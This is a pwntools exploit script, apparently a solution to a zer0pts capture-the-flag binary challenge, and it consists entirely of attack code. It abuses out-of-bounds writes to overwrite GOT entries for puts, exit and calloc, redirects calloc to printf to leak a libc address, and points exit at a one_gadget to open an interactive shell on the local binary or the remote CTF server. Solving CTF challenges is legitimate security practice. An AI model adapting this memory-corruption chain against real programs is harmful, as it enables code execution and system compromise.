#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env={ 'LD_LIBRARY_PATH': '.' })
else:
    s = remote('pwn.ctf.zer0pts.com', 9004)

elf = ELF('./chall')
libc = ELF('./libc.so.6')

ret = 0x4005ce

# puts -> main
s.sendlineafter('n = ', '-1')
s.sendlineafter('i = ', str(elf.got['puts'] // 4))
s.sendlineafter('= ', str(elf.symbols['main']))

# exit -> after calloc
s.sendlineafter('n = ', '-1')
s.sendlineafter('i = ', str(elf.got['exit'] // 4))
s.sendlineafter('= ', str(0x4007a8))

# puts -> before exit
s.sendlineafter('n = ', '-1')
s.sendlineafter('i = ', str(elf.got['puts'] // 4))
s.sendlineafter('= ', str(0x40078d))

# calloc -> printf
s.sendlineafter('i = ', str(elf.got['calloc'] // 4))
s.sendlineafter('= ', str(elf.symbols['printf']))

s.sendlineafter('i = ', str((elf.got['calloc'] + 4) // 4))
s.sendlineafter('= ', '0')

# puts -> main
s.sendlineafter('i = ', str(elf.got['puts'] // 4))
s.sendlineafter('= ', str(elf.symbols['main']))

# exit -> ret
s.sendlineafter('n = ', str(0xff600000 - (1<<32)))
s.sendlineafter('i = ', str((elf.got['exit'] - 4) // 4))
s.sendlineafter('= ', str(ret))

# leak libc
s.sendlineafter('n = ', str(elf.got['setbuf']))
libc_base = u64(s.recv(6).ljust(8, '\0')) - 0x8ec50
log.info('libc base: %#x' % libc_base)
s.sendlineafter('i = ', str(elf.bss(0x100) // 4))
s.sendlineafter('= ', str(0xdeadbeef))

# exit -> one gadget
one_gadget = libc_base + 0xe6c81
s.sendlineafter('n = ', str(0xff600000 - (1<<32)))
s.sendlineafter('i = ', str((elf.got['exit'] - 4) // 4))
s.sendlineafter('= ', str(one_gadget % (1<<32)))

s.sendlineafter('n = ', str(0xff600000 - (1<<32)))
s.sendlineafter('i = ', str((elf.got['exit']) // 4))
s.sendlineafter('= ', str(one_gadget >> 32))

s.sendlineafter('n = ', str(0x100))

s.interactive()
